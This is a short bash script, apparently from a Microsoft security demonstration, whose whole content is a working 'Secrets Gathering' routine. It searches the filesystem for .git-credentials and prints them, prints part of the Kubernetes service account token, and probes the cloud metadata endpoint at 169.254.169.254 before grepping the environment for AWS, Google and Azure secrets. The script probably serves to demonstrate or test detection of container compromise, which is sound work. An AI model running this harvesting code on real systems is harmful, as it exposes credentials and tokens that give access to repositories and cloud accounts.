#!/bin/bash

# Copyright (c) Microsoft Corporation.
# Licensed under the MIT License.

echo "--- Secrets Gathering ---"
echo "Searching for sensitive files"
git_creds_file=$(find / -path */.git-credentials 2>/dev/null)
if (test -n $git_creds_file); then
    git_creds=$(cat $git_creds_file)
    echo "Found .git-credential at $git_creds_file: $git_creds"
else
    echo ".git-credential not found"
fi
echo " "
kube_token_file="/var/run/secrets/kubernetes.io/serviceaccount/token"
if (test -f $kube_token_file); then
    kube_token=$(cat $kube_token_file | head -c 30 && echo "...")
    echo "Found Kubernetes service account in $kube_token_file: $kube_token"
else
    echo "Kubernetes service account token not found"
fi
echo " "
echo "Looking for secrets in environment variables"
if (`curl -sf -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/" -o /dev/null`); then
    set | grep GOOGLE_DEFAULT_CLIENT_SECRET= || echo "No secrets found in environment variable"
elif (`curl -sf -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" -o /dev/null`); then
    set | grep AWS_SECRET_ACCESS_KEY= || echo "No secrets found in environment variable"
else
    set | grep AZURE_CREDENTIAL_FILE= || echo "No secrets found in environment variable"
fi
echo " "
